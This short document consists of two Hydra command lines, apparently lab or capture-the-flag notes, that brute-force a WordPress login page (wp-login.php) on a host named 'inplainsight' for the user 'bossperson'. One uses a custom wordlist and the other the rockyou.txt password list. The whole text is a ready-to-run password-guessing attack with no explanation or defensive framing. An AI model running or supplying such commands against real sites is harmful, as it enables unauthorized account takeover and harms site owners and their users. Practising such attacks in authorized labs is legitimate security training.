
hydra -l bossperson -P wp-wordlist.txt inplainsight http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=ERROR'

hydra -l bossperson -P /usr/share/wordlists/rockyou.txt inplainsight http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=ERROR'
